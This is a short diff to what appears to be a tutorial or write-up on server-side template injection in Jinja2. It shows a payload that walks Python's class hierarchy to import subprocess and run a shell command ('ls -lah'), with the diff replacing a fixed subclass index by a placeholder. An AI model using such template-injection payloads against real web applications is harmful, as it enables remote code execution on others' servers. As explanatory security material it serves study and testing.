@@ -132,5 +132,5 @@ subprocess.check_output(['ls', '-lah'])
 ```
 The list ['ls', '-lah'] contains the command ls and its argument -lah. The command is clearly separated from its arguments, which ensures that each part is correctly handled as intended. So the final payload will then be 
 ```
-{{"".__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get("__builtins__").get("__import__")("subprocess").check_output(['ls', '-lah'])}}
+{{"".__class__.__mro__[1].__subclasses__()[<index-of-subprocess.popen>].__repr__.__globals__.get("__builtins__").get("__import__")("subprocess").check_output(['ls', '-lah'])}}
 ```
